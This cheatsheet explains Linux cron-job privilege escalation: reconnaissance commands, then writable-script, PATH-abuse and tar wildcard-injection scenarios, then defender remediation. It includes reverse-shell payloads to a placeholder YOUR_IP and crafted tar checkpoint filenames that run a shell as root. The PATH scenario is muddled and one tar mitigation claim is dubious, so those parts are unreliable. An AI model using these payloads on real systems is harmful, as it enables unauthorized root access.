## 🤖 Cheatsheet: Cron Job Privilege Escalation

Cron is the standard job scheduler in Linux, used to run tasks automatically at specific times. A misconfiguration arises when a cron job, especially one running as **root**, interacts with a script or directory that can be modified by a lower-privileged user. This allows the user to inject malicious code that will be executed with the high privileges of the cron job.

### ## What to Look For (Reconnaissance)

An attacker will look for scheduled tasks and then check the permissions of everything they touch.

* **List System-Wide Cron Jobs:**
    ```bash
    cat /etc/crontab
    ls -l /etc/cron.d/
    ls -l /etc/cron.hourly/
    ls -l /etc/cron.daily/
    ls -l /etc/cron.weekly/
    ls -l /etc/cron.monthly/
    ```

* **Check User-Specific Cron Jobs:** (Less likely for privesc unless you can edit another user's crontab)
    ```bash
    crontab -l
    cat /var/spool/cron/crontabs/root
    ```

* **Monitor Running Processes:** Tools like **pspy** are excellent for dynamically monitoring a system. They will show you cron jobs executing in real-time, which can reveal scripts that are not obvious from static analysis.
    ```bash
    # Run pspy to see all process starts
    ./pspy64
    ```
    

---

### ## Common Exploitable Scenarios & Payloads

The goal is to find a way to modify what the privileged cron job executes.

#### **Scenario 1: Writable Cron Script**
This is the most common and direct vulnerability. A script executed by a root cron job is writable by a non-root user.

* **Discovery:**
    1.  You see a job in `/etc/crontab`: `* * * * * root /usr/local/bin/backup.sh`
    2.  You check the script's permissions: `ls -l /usr/local/bin/backup.sh`
    3.  The output shows the file is world-writable (`-rwxrwxrwx`).

* **Exploitation:**
    * Append a reverse shell command to the script. The next time it runs (within one minute), it will connect back to you as root.
        ```bash
        # Set up a listener on your machine: nc -lvnp 4444
        # On the target, append your payload:
        echo 'bash -c "bash -i >& /dev/tcp/YOUR_IP/4444 0>&1"' >> /usr/local/bin/backup.sh
        ```

#### **Scenario 2: PATH Variable Abuse**
The cron job uses a relative path for a command, and a directory in the cron's `$PATH` is writable.

* **Discovery:** The cron job runs `* * * * * root backup-script`. The default cron `$PATH` is often just `/usr/bin:/bin`. If the script is actually in `/usr/local/bin`, but a script *within* it calls another command like `touch` without a full path, an attacker could exploit this if they can write to `/usr/bin`.

* **Exploitation:**
    1.  Create a malicious executable with the same name as the relative command (e.g., `touch`).
    2.  Place it in the writable directory within the cron's `$PATH`.
    3.  When the main script is run by cron, it will execute your malicious file with root privileges.

#### **Scenario 3: Wildcard Injection**
A cron job uses a wildcard (`*`) in a command that can be abused, like `tar` or `chown`.

* **Discovery:** You see a job: `* * * * * root tar -czf /backups/archive.tgz /home/user/files/*`
    The `*` is the vulnerability. `tar` can interpret filenames that start with `--` as options.

* **Exploitation:**
    1.  Go to the `/home/user/files/` directory.
    2.  Create two files:
        ```bash
        touch -- "--checkpoint=1"
        touch -- "--checkpoint-action=exec=bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'"
        ```
    3.  When `tar` runs, it will treat these filenames as command-line arguments, executing your reverse shell.

---

### ## 🛡️ Detection & Remediation (For Defenders)

#### **How to Detect an Attempt**

* **File Integrity Monitoring (FIM):** Use tools like **AIDE** or **Tripwire**. You should receive an immediate alert if a script in `/etc/cron.d/` or `/usr/local/bin/` is modified.
* **Log Auditing:** Check cron logs (often in `/var/log/syslog` or `/var/log/cron`) for unusual activity or failures.

#### **How to Prevent Cron Job Abuse**

* **Enforce Strict File Permissions:** Scripts and binaries executed by root cron jobs should be owned by **root** and should **not** be writable by any other user. A permission of `755` (`-rwxr-xr-x`) or stricter is appropriate.
    ```bash
    sudo chown root:root /path/to/script.sh
    sudo chmod 755 /path/to/script.sh
    ```
* **Always Use Absolute Paths:** Never use relative paths in a cron definition. This prevents any ambiguity and path-related attacks.
    ```
    # Bad:
    * * * * * root backup.sh

    # Good:
    * * * * * root /usr/local/bin/backup.sh
    ```
* **Validate Wildcard Usage:** Be extremely careful when using wildcards. Ensure they are not used on directories where users can create files. When using tools like `tar` or `rsync`, use options that limit wildcard interpretation or path traversal. For `tar`, specifying the path *after* the options can help mitigate this specific attack.
* **Regular Audits:** Periodically review all system and user cron jobs. Check the permissions of every file and directory they reference.
